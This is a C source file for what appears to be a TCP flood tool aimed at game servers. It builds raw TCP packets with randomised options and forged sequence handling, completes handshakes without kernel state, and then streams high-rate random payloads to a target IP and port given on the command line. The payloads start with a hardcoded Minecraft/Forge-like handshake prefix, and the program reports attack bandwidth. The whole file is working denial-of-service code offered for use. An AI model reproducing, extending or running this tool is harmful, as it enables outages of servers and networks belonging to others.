//@shiftwise
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <fcntl.h>
#include <netpacket/packet.h>
#include <net/if.h>
#include <linux/if_ether.h>
#include <netinet/tcp.h>
#include <netinet/ip.h>
#include <string.h>
#include <time.h>
#include <pthread.h>
#include <assert.h>
#include <netdb.h>
//@shiftwise
#define NANOS 1000000000

uint64_t mytime()
{
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    uint64_t time_in_micros = (1000000000L * ts.tv_sec + (ts.tv_nsec));
    return time_in_micros;
}
//@shiftwise
struct connection
{
    int fd;
    in_addr_t saddr;
    in_addr_t daddr;
    uint16_t sport;
    uint16_t dport;
    uint32_t seq;
    uint32_t ack;
    uint32_t sseq;
    uint8_t state;
    uint32_t sent;
    uint64_t time;
    struct sockaddr_in addr;
    uint32_t window;
    uint8_t tries;
    uint8_t resets;
    uint32_t pending;
    uint32_t tsval;
    uint32_t tsecr;
    uint64_t trip;
    uint8_t re;
    uint64_t resp;
    uint16_t fake_win;
    uint8_t scaling;
    uint64_t rett;
};

/*
    96 bit (12 bytes) pseudo header needed for tcp header checksum calculation
*/
struct pseudo_header
{
    u_int32_t source_address;
    u_int32_t dest_address;
    u_int8_t placeholder;
    u_int8_t protocol;
    u_int16_t tcp_length;
};

/*
    Generic checksum calculation function
*/
unsigned short csum(unsigned short *ptr, int nbytes)
{
    register long sum;
    unsigned short oddbyte;
    register short answer;

    sum = 0;
    while (nbytes > 1)
    {
        sum += *ptr++;
        nbytes -= 2;
    }
    if (nbytes == 1)
    {
        oddbyte = 0;
        *((u_char *)&oddbyte) = *(u_char *)ptr;
        sum += oddbyte;
    }

    sum = (sum >> 16) + (sum & 0xffff);
    sum = sum + (sum >> 16);
    answer = (short)~sum;

    return (answer);
}

int tcp_packet(char *datagram, struct connection *conn, uint32_t src, uint32_t dst, uint16_t sport, uint16_t dport, uint32_t seq, uint32_t ack, uint8_t flags, char *data, size_t data_len)
{
    conn->trip = mytime() / 1000000;

    uint8_t optsize = (flags & TH_SYN) ? 20 : 12;

    uint16_t tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + data_len + optsize;

    struct iphdr *iph = (struct iphdr *)datagram;
    iph->version = 4;
    iph->ihl = 5;
    iph->frag_off = htons(IP_DF);
    iph->ttl = 64;
    iph->tos = 0;
    iph->tot_len = tot_len;
    iph->id = htons(10000 + rand() % 55535);
    iph->check = 0;
    iph->protocol = 6;
    iph->saddr = src;
    iph->daddr = dst;

    struct tcphdr *tcph = (struct tcphdr *)(datagram + sizeof(struct iphdr));
    tcph->source = sport;
    tcph->dest = dport;
    tcph->seq = htonl(seq);
    tcph->ack_seq = htonl(ack);
    tcph->doff = 5 + optsize / 4;
    tcph->syn = (flags & TH_SYN) ? 1 : 0;
    tcph->urg = 0;
    tcph->ack = (flags & TH_ACK) ? 1 : 0;
    tcph->psh = (flags & TH_PUSH) ? 1 : 0;
    tcph->fin = (flags & TH_FIN) ? 1 : 0;
    tcph->rst = 0;
    tcph->window = htons(32168 + (rand() % 22447));
    tcph->urg_ptr = 0;
    tcph->check = 0;
    memcpy(datagram + sizeof(struct iphdr) + sizeof(struct tcphdr) + optsize, data, data_len);

    uint32_t tsval = htonl(conn->tsval);
    uint32_t tsecr = htonl(conn->tsecr);

    if (flags & TH_SYN)
    {

        uint16_t mss[] = {
            1460
        };

        uint8_t scaling[] = {
            7,
            8,
            9};

        uint16_t sel_mss = htons(mss[rand() % 1]);

        char optss[20];
        memcpy(optss, "\x02\x04\x05\x64\x01\x01\x08\x0a\x00\x00\x00\x00\x00\x00\x00\x00\x01\x03\x03\x09", 20);
        memcpy(optss + 2, &sel_mss, 2);
        optss[19] = scaling[rand() % 3];

        memcpy(datagram + sizeof(struct iphdr) + sizeof(struct tcphdr), optss, 20);
        memcpy(datagram + sizeof(struct iphdr) + sizeof(struct tcphdr) + 8, &tsval, 4);
    }
    else
    {
        datagram[sizeof(struct iphdr) + sizeof(struct tcphdr)] = 0x01;
        datagram[sizeof(struct iphdr) + sizeof(struct tcphdr) + 1] = 0x01;
        datagram[sizeof(struct iphdr) + sizeof(struct tcphdr) + 2] = 0x08;
        datagram[sizeof(struct iphdr) + sizeof(struct tcphdr) + 3] = 0x0a;

        memcpy(datagram + sizeof(struct iphdr) + sizeof(struct tcphdr) + 4, &tsval, 4);
        memcpy(datagram + sizeof(struct iphdr) + sizeof(struct tcphdr) + 4 + 4, &tsecr, 4);
    }

    //printf("TSval %lu TSecr %lu\n", conn->tsval, conn->tsecr);

    struct pseudo_header psh;

    psh.source_address = iph->saddr;
    psh.dest_address = iph->daddr;
    psh.placeholder = 0;
    psh.protocol = IPPROTO_TCP;
    psh.tcp_length = htons(sizeof(struct tcphdr) + data_len + optsize);

    int psize = sizeof(struct pseudo_header) + sizeof(struct tcphdr) + data_len + optsize;
    char *pseudogram = malloc(psize);
    memset(pseudogram, 0, psize);

    memcpy(pseudogram, (char *)&psh, sizeof(struct pseudo_header));
    memcpy(pseudogram + sizeof(struct pseudo_header), tcph, sizeof(struct tcphdr) + data_len + optsize);
    iph->check = 0;
    //iph->check = csum((unsigned short *)datagram, tot_len);
    tcph->check = csum((unsigned short *)pseudogram, psize);
    free(pseudogram);

    return tot_len;
}

int data_size = 1300;
int cons = 1;
int pps = 10;

void tohex(unsigned char *in, size_t insz, char *out, size_t outsz)
{
    unsigned char *pin = in;
    const char *hex = "0123456789ABCDEF";
    char *pout = out;
    for (; pin < in + insz; pout += 2, pin++)
    {
        pout[0] = hex[(*pin >> 4) & 0xF];
        pout[1] = hex[*pin & 0xF];
        if (pout + 3 - out > outsz)
        {
            /* Better to truncate output string than overflow buffer */
            /* it would be still better to either return a status */
            /* or ensure the target buffer is large enough and it never happen */
            break;
        }
    }
    pout[-1] = 0;
}

int amax = 0;

#define BUFSIZE 4096
#define VLEN 5

char *strtokm(char *input, char *delimiter, char **string)
{
    if (input != NULL)
        *string = input;

    if (*string == NULL)
        return *string;

    char *end = strstr(*string, delimiter);
    if (end == NULL)
    {
        char *temp = *string;
        *string = NULL;
        return temp;
    }

    char *temp = *string;

    *end = '\0';
    *string = end + strlen(delimiter);
    return temp;
}

int main(int argc, char *argv[])
{

    setbuf(stdout, NULL);
    srand(time(NULL));

    if (argc < 6)
    {
        return 0;
    }

    cons = atoi(argv[3]);
    data_size = atoi(argv[4]);
    pps = atoi(argv[5]);

    struct timespec t;
    clock_gettime(CLOCK_MONOTONIC, &t);

    int raw_fd = socket(AF_INET, SOCK_RAW | SOCK_NONBLOCK, IPPROTO_TCP);

    if (raw_fd < 1)
    {
        perror("socket");
        return 0;
    }

    // IP_HDRINCL to tell the kernel that headers are included in the packet
    int one = 1;
    const int *val = &one;

    if (setsockopt(raw_fd, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0)
    {
        perror("Error setting IP_HDRINCL");
        exit(0);
    }

    uint64_t start_time = mytime();
    //@shiftwise
    uint32_t sends = 0;
    uint32_t sentt = 0;
    uint32_t recvs = 0;
    uint64_t send_time = 0;
    uint64_t adapt_time = 0;
    double bandwidth = 0;

    char datagram[1500];
    memset(datagram, 0, 1500);
    char packet[1450];
    memset(packet, 0, 1450);

    struct sockaddr_in source, dest;

    struct mmsghdr msgs[VLEN];
    struct iovec iovecs[VLEN];
    char bufs[VLEN][BUFSIZE + 1];

    struct connection conns[cons];
    memset(conns, 0, sizeof(struct connection) * cons);
    int curr = 0;
    int active = 0;

    uint32_t dest_addr = inet_addr(argv[1]);
    uint16_t dest_port = htons(atoi(argv[2]));

    int64_t r = NANOS / pps;

    uint64_t penalty = 0;
    struct timespec tr;

    uint64_t delay = 0;
    uint64_t newDelay = 0;

    uint64_t conni = 0;

    int fdr = open("/dev/urandom", O_RDONLY);
    //@shiftwisе
    while (1)
    {

        uint64_t mytime1 = mytime();

        if (mytime1 - send_time >= 1000000000)
        {
            send_time = mytime1;

            printf("sends = %i pps = %i recvs = %i cons %i bandwidth=%.2fMbit/s\n", sends, pps, recvs, cons, (bandwidth / 1024.0 / 1024.0) * 8.0);

            sends = 0;
            recvs = 0;
            bandwidth = 0;
        }
        if (active > 0) {
            if (mytime() - delay >= r) {
                delay = mytime();
                while (1) {
                    struct connection *conn = &conns[conni % cons];

                    if (conn->state == 2) {
                        if (mytime() - conn->resp >= 1000000000 && data_size < 1333) {
                            //printf("Reset\n");
                            conn->state = 0;
                            curr--;
                            active--;
                            break;
                        }

                        char b[1500];
                        read(fdr, b, 1500);

                        memcpy(b, "\x19\x00\xd4\x02\x12\x33\x31\x2e\x32\x31\x34\x2e\x32\x34\x34\x2e\x31\x39\x00\x46\x4d\x4c\x00\x63\xdd\x01\x01\x00\x11\x22\x33", 31);

                        int datagram_len = tcp_packet(datagram, conn, conn->saddr, conn->daddr, conn->sport, conn->dport, conn->seq, conn->ack, TH_ACK | TH_PUSH, b, data_size);
                        sendto(raw_fd, datagram, datagram_len, 0, (struct sockaddr *)&conn->addr, sizeof(struct sockaddr_in));
                        bandwidth += datagram_len;
                        sentt++;
                        sends++;

                        conn->seq += data_size;
                        conni++;
                        break;
                    }
                    conni++;
                }
            }
        }
        //@shiftwisе
        for (int i = 0; i < cons; i++) {
            struct connection *conn = &conns[i];

            if (conn->state > 1 || (conn->state == 1 && mytime() - conn->time < 1000000000))
                continue;

            if (mytime() - newDelay < 80000000)
                continue;

            newDelay = mytime();

            int cfd = socket(AF_INET, SOCK_STREAM | SOCK_NONBLOCK, 0);
            struct sockaddr_in addr = {0}, laddr = {0};
            addr.sin_family = AF_INET;
            addr.sin_addr.s_addr = inet_addr("1.1.1.1");
            addr.sin_port = htons(80);
            connect(cfd, (struct sockaddr *)&addr, sizeof(addr));
            int l = sizeof(laddr);
            getsockname(cfd, (struct sockaddr *)&laddr, &l);
            close(cfd);

            conn->saddr = laddr.sin_addr.s_addr;
            conn->sport = rand() % 0xFFFF;
            conn->daddr = dest_addr;
            conn->dport = dest_port;
            conn->state = 0;
            memcpy(&conn->addr, &addr, sizeof(addr));

            conn->tsval = 124127841 + (rand() % 124127841);
            conn->tsecr = 0;
            conn->seq = 1247124 + rand() % 127849214;
            conn->ack = 0;

            int datagram_len = tcp_packet(datagram, conn, conn->saddr, conn->daddr, conn->sport, conn->dport, conn->seq, conn->ack, TH_SYN, "", 0);

            //printf("Syn %d\n", conn->sport);

            conn->state = 1;
            conn->time = mytime();
            bandwidth += datagram_len;
            sendto(raw_fd, datagram, datagram_len, 0, (struct sockaddr *)&conn->addr, sizeof(struct sockaddr_in));
            curr++;

            if (data_size == 1333) {
                conn->seq = rand();
                conn->ack = rand();

                
                
                conn->state = 2;
                active++;
                conn->window = 64400 * 1 << 7;
                conn->scaling = 7;
                int datagram_len = tcp_packet(datagram, conn, conn->saddr, conn->daddr, conn->sport, conn->dport, conn->seq, conn->ack, TH_ACK, "", 0);
                sendto(raw_fd, datagram, datagram_len, 0, (struct sockaddr *)&conn->addr, sizeof(struct sockaddr_in));
                bandwidth += datagram_len;
                sentt++;
                sends++;
            }
        }

        int off = 0;

        memset(msgs, 0, sizeof(msgs));
        for (int i = 0; i < VLEN; i++)
        {
            iovecs[i].iov_base = bufs[i];
            iovecs[i].iov_len = BUFSIZE;
            msgs[i].msg_hdr.msg_iov = &iovecs[i];
            msgs[i].msg_hdr.msg_iovlen = 1;
        }
        struct timespec timeout;
        timeout.tv_sec = 0;
        timeout.tv_nsec = 0;
        int retval;
        do {
            retval = recvmmsg(raw_fd, msgs, VLEN, MSG_DONTWAIT, &timeout);
            if (retval == -1)
            {
                break;
            }

            for (int i = 0; i < retval; i++)
            {

                int rcvd = msgs[i].msg_len;
                char *buf = bufs[i];

                if (rcvd > 20)
                {
                    struct iphdr *iph = (struct iphdr *)(buf + off);
                    if (iph->protocol == 6 && iph->saddr == dest_addr)
                    {
                        recvs++;

                        struct tcphdr *tcph = (struct tcphdr *)(buf + off + sizeof(struct iphdr));

                        

                        for (int j = 0; j < cons; j++)
                        {
                            struct connection *conn = &conns[j];

                            if (conn->state == 0)
                                continue;

                            //printf("%d %d %d %d %d\n", htons(tcph->source), htons(dest_port), htons(tcph->dest), conn->sport, htons(conn->sport));

                            if (tcph->source == dest_port && tcph->dest == conn->sport) {

                                conn->resp = mytime();



                                if (tcph->ack) {
                                    

                                    uint8_t *p = (uint8_t *)tcph + 20; // or sizeof (struct tcphdr)
                                    uint8_t *end = (uint8_t *)tcph + tcph->doff * 4;
                                    while (p < end)
                                    {
                                        uint8_t kind = *p++;
                                        if (kind == 0)
                                        {
                                            break;
                                        }
                                        if (kind == 1)
                                        {
                                            // No-op option with no length.
                                            continue;
                                        }
                                        uint8_t size = *p++;
                                        if (kind == 8)
                                        {
                                            conn->tsecr = htonl(*(uint32_t *)p);
                                            conn->tsval = conn->tsecr + 1;
                                        }
                                        p += (size - 2);
                                    }

                                    if (tcph->syn) {

                                        uint8_t *p = (uint8_t *)tcph + 20; // or sizeof (struct tcphdr)
                                        uint8_t *end = (uint8_t *)tcph + tcph->doff * 4;
                                        uint16_t scaling = 1;
                                        while (p < end)
                                        {
                                            uint8_t kind = *p++;
                                            if (kind == 0)
                                            {
                                                break;
                                            }
                                            if (kind == 1)
                                            {
                                                // No-op option with no length.
                                                continue;
                                            }
                                            uint8_t size = *p++;
                                            if (kind == 3)
                                            {
                                                scaling = *p;
                                            }
                                            p += (size - 2);
                                        }

                                        conn->seq = htonl(tcph->ack_seq);
                                        conn->ack = htonl(tcph->seq) + 1;

                                        
                                        
                                        conn->state = 2;
                                        conn->rett = mytime();
                                        active++;
                                        conn->window = htons(tcph->window) * 1 << scaling;
                                        conn->scaling = scaling;
                                        int datagram_len = tcp_packet(datagram, conn, conn->saddr, conn->daddr, conn->sport, conn->dport, conn->seq, conn->ack, TH_ACK, "", 0);
                                        sendto(raw_fd, datagram, datagram_len, 0, (struct sockaddr *)&conn->addr, sizeof(struct sockaddr_in));
                                        bandwidth += datagram_len;
                                        sentt++;
                                        sends++;
                                    }

                                    int tcpdatalen = ntohs(iph->tot_len) - (tcph->doff * 4) - (iph->ihl * 4);    

                                    if (tcpdatalen > 0) {
                                        if (mytime() - conn->rett > 500000000) {
                                            conn->rett = mytime();
                                            conn->ack += tcpdatalen;
                                            int datagram_len = tcp_packet(datagram, conn, conn->saddr, conn->daddr, conn->sport, conn->dport, conn->seq, conn->ack, TH_ACK, "", 0);
                                            sendto(raw_fd, datagram, datagram_len, 0, (struct sockaddr *)&conn->addr, sizeof(struct sockaddr_in));
                                            bandwidth += datagram_len;
                                            sentt++;
                                            sends++;
                                        }
                                    }
                                }else {
                                    if (tcph->rst) {
                                        if (conn->resets++ >= 10000) {
                                            conn->state = 0;
                                            conn->resets = 0;
                                            curr--;
                                            active--;
                                        }
                                    }
                                }
                                break;
                            } 
                        }
                    }
                }
            }
        } while (retval == VLEN);
    }
    return 0;
}
//@shiftwise